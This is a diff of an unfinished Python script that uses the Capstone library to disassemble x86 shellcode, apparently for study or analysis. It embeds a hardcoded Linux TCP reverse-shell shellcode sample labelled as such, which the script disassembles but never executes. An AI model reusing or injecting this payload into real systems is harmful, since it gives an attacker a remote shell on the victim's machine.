@@ -1,6 +1,9 @@
+#!/usr/bin/python
 from capstone import *
+import sys
+#reference: from http://www.capstone-engine.org/lang_python.html
 
-
+#a tcp reverse shell sample
 shellcode = (
 "\x31\xdb\xf7\xe3\x6a\x66\x58\xfe\xc3"
 "\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
@@ -16,16 +19,40 @@ shellcode = (
 "\x2f\x2f\x73\x68"
 )
 
+def main():
+	if len(sys.argv) < 3:
+		usage()
 
-#from http://www.capstone-engine.org/lang_python.html
+def usage():
+	print "%s -o <out_file> -s <shellcode_file>" %sys.argv[0]
 
-#we create a disassembler object from the capstone constructor
-#Cs, the two arguments are the architecture and the mode.
-disassembler = Cs(CS_ARCH_X86, CS_MODE_32)
+def to_outfile(file_name, disassembly):
+	fd = open(file_name, "w")
 
-#we call the disasm function of our class here, the second argument 
-#is the starting address of the code
-for op in disassembler.disasm(shellcode, 0x0):
-	#we get a list back from the call that gives us access to
-	#certain fields, such as op_str
-	print("0x%x:\t%s\t%s" %(op.address, op.mnemonic, op.op_str))
+
+#This function disassembles the given shellcode using
+#capstones disasm method.
+def disassemble(shellcode):
+	disassembled = ""	
+	#we create a disassembler object from the capstone constructor
+	#Cs, the two arguments are the architecture and the mode.
+	disassembler = Cs(CS_ARCH_X86, CS_MODE_32)
+
+	#we call the disasm function of our class here, the second argument 
+	#is the starting address of the code
+	for op in disassembler.disasm(shellcode, 0x0):
+		#we get a list back from the call that gives us access to
+		#certain fields, such as op_str
+		disassembled = \
+		disassembled + "0x%x:\t%s\t%s\n" %(op.address, op.mnemonic, op.op_str)
+
+	return disassembled
+
+
+
+
+if __name__ == '__main__':
+	main()
+
+
+
